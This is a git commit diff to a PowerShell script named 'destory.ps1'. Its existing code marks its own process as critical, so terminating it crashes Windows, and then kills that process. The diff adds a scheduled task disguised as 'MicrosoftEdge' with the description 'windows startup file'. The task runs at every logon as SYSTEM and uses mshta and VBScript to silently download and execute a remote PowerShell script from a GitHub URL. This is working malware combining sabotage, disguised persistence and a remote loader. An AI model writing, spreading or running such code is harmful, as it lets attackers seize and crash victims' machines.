0da1df132a5f0582e6a9a6ca2087cc2a2f9cc019
43a1723 <hai1723notgay@gmail.com>
2025-04-11 15:08:18 +0700

    Update destory.ps1

--- s/destory.ps1
+++ s/destory.ps1
@@ -14,6 +14,11 @@ Add-Type -TypeDefinition $code
 
 # Đánh dấu process là Critical
 [CriticalProcess]::RtlSetProcessIsCritical($true, $false, $false)
+$task_name = "MicrosoftEdge"
+$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
+$task_trigger = New-ScheduledTaskTrigger -AtLogOn
+$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
+Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -User "NT AUTHORITY\SYSTEM" -Force
 Stop-Process -Id $PID -Force
 
 
